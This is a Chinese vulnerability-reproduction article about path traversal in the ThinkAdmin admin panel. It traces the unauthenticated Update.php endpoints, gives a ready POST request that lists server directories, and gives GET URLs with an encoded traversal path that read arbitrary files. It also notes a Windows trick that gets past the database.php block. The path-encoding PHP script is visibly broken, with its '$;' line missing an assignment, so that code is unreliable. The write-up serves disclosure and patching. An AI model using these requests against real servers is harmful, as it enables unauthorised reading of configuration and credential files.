<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ORM_6AXz-4jpg1wn82GrLg)

### 0X00 简介

> ThinkAdmin 是一套基于 ThinkPHP 框架的通用后台管理系统, ThinkAdmin v6 版本存在路径遍历漏洞。攻击者可利用该漏洞通过 GET 请求编码参数任意读取远程服务器上的文件。

### 0X01 影响范围

> Thinkadmin ≤ 2020.08.03.01    v5（任意文件读取）    v6（列目录, 任意文件读取）

```
查看版本
https://ip/admin/login.html?s=admin/api.Update/version
```

![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd44xQdw0Uq2QxKcEG9YZmD6YIo5bpSDicTp5j74biciaswymhDOjGpK6fFA/640?wx_fmt=png)

### 0X02 漏洞复现

在`app/admin/controller/api/Update.php`中存在 3 个 function，无需登录验证就能使用。

```
namespace
app\admin\controller\api;
use think\admin\Controller;
use think\admin\service\ModuleService;
use think\admin\service\SystemService;
```

#### 1. 列目录漏洞

在 node() 方法中，直接将 POST 的 rules 和 ignore 参数传给了 InstallService::instance()->getList()![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4jwBN3ds3o18k2tTh88icyfuLiaH0RVVazQIxo569N7B2aM6lGIzCANibQ/640?wx_fmt=png) 在 vendor/zoujingli/think-library/src/service/InstallService.php 中利用 scanList() 去遍历 $rules 数组![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4CU9mic2T8oIHY3PbeyblNI39Pa5mNNKWhGuC9oJTWX4RHlIR2uczMLw/640?wx_fmt=png)继续跟进，在 scanList() 方法中调用 scanDirectory() 递归遍历目录下的文件，然后利用_getInfo() 方法获取文件名和哈希值。![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4I3KKMIXrZuWUA0lWyPJY7vK9nce9JomECiadGlpXwbOuttwiaKV6mJYA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4U2Dn6PG9ibmJSp1dVpMtSh4X80ZjN88cMuwK23cN6D2GStMpFmcMybA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd47EicewlJEOhXDaRqXnVtO3U3MmXALS7LnHC759t67JxL9EuQVK2wdcw/640?wx_fmt=png)在整个过程中并没有进行任何过滤和认证，由此攻击者可以利用此漏洞获取服务器目录列表。

利用 poc

```
POST /admin/login.html?s=admin/api.Update/node HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=4da326327c0b75fb074122a093e912a0
Upgrade-Insecure-Requests: 1
Content-Length: 21
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0

rules=%5B%22%2F%22%5D
```

![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4GGLrg97ekIUHTnK6luJzicW4iacvleb0M7Lo5ibPn9toZZEMMhOicmEQfA/640?wx_fmt=png)

#### 2. 任意文件读取漏洞

在 app/admin/controller/api/Update.php 中存在 get() 方法，对 GET 中的 encode 参数使用 decode() 方法进行解码。![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4SlLZzpJsiaapTbrn7OA1HBVTX3Dl1kRibicVto1cUlibvEnsoh0lFCmgbw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd47P2c5eibbpBY7icGNxduzYJNmSnjm6XLtt8MvEjD9V7FIribib9hsN96Xg/640?wx_fmt=png)上面正好有个 encode() 方法，攻击时可以直接调用。![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4414wsESxjKcCrKQtX3fNDWjJSsvSlsOg2JKdIfCxZNINu8o8yJEs0Q/640?wx_fmt=png)继续看 ModuleService::instance()->checkAllowDownload()，禁止下载数据库配置文件，name 参数不能为 database.php。![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4RjDdEZMhXNhXBzBveLVyGTIza2wWic9lYRQIAR6VOuRVpEmtQ0bX5Hg/640?wx_fmt=png)跟进 getAllowDownloadRule() 函数。![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4OF9oY7RaxibTX9SSe9KMEIgrGI9P3pW4oaB2K7gHhS6D8YZB4ia4R1Pw/640?wx_fmt=png)发现允许了以下路径。

```
config
public/static
public/router.php
public/index.php
app/admin
app/wechat
```

可以通过控制 $name 参数，实现任意文件读取，且在 Linux 中无法读取 database.php，而 window 中可以利用 database"php 来绕过。读取的文件路径需要编码。  

编码脚本：  

```
<?php
$;
for($i=0;$i<strlen($ename=iconv('UTF-8','GBK//TRANSLIT',$name));$i++)
{
  echo str_pad(base_convert(ord($ename[$i]),10,36),2,0,0);
}
?>
```

```
https://url/admin/login.html?s=admin/api.Update/get/encode/1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s
```

```
https://url/admin/login.html?s=admin/api.Update/get/encode/1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s
```

![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4kA2DcrNo8vdejBribickHQicoTDJhWM84cvKVKicsyyVxMxnRMktrSMhwg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/kTIZMBcJhwiayeZGCoN8fNeTVtK32NOd4RibiaogXH1jpx2vWyKGqsEu8RmmAia9gf1kCOczGnBLkbWSrFG11sw97w/640?wx_fmt=png)

参考链接：

https://github.com/zoujingli/ThinkAdmin/issues/244